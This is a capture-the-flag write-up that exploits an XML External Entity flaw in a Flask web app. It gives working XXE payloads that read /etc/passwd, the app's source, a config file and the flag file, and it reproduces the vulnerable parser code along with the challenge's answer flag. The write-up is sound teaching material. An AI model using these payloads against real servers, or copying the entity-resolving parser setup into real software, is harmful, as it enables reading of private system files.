<img width="582" height="364" alt="Screenshot 2025-08-27 221025" src="https://github.com/user-attachments/assets/7388a500-3e31-4eda-a2db-ca7602028595" />

# Challenge

The challenge gives us an XML “Processor” web app where we can submit arbitrary XML. This immediately suggests XML External Entity (XXE) injection.

<img width="923" height="626" alt="image" src="https://github.com/user-attachments/assets/bb116e36-962d-4c7a-9e19-552babc5b250" />

1. Prove XXE is working

Payload to test reading `/etc/passwd` (classic harmless file):

```
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
<root>&x;</root>

```

<img width="898" height="900" alt="image" src="https://github.com/user-attachments/assets/1bbfb36c-9694-448c-b8c8-9598b5fa1806" />

2. Inspect application code

Next, check the app source for hints by reading `app.py` from the current working directory:

```
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY x SYSTEM "file:///proc/self/cwd/app.py"> ]>
<root>&x;</root>

```

<img width="867" height="894" alt="image" src="https://github.com/user-attachments/assets/35b7726f-768d-47a4-95aa-7f49cf49f07a" />

```
<root># app.py
from flask import Flask, request, render_template
from lxml import etree
import time
# CONFIG_FILE_PATH = "/etc/superapp/config.xml"



app = Flask(__name__)


@app.before_request
def slow_down_all_requests():
    time.sleep(0.2)




@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        xml_content = request.form.get('xml', '')
        parser = etree.XMLParser(resolve_entities=True)
        try:
            doc = etree.fromstring(xml_content.encode('utf-8'), parser=parser)
            result = etree.tostring(doc, pretty_print=True).decode('utf-8')
            return render_template('index.html', result=result, xml_input=xml_content)
        except Exception as e:
            return render_template('index.html', error=str(e), xml_input=xml_content)

    return render_template('index.html')

if __name__ == '__main__':
    app.run(host="0.0.0.0", debug=True)
</root>
```

3. Follow configuration hints

From app.py, we see it references `/etc/superapp/config.xml`. Let’s dump it:

```
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY x SYSTEM "file:///etc/superapp/config.xml"> ]>
<root>&x;</root>
```

<img width="822" height="736" alt="image" src="https://github.com/user-attachments/assets/b38a8874-bdfb-42da-9daf-e6f0d574cb9f" />

```
<root><configuration>     <database>         <host>localhost</host>         <user>db_user</user>     </database>     <logging>                 <secret_storage_path>/var/data_archive/secret/flag.txt</secret_storage_path>     </logging> </configuration>
</root>
```
## Flag

4. Exfiltrate the flag

```
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY x SYSTEM "file:///var/data_archive/secret/flag.txt"> ]>
<root>&x;</root>
```

Finally, retrieve the flag directly:

```
n3xt{xxe_1s_n0t_s0_3xt3rn4l}
```

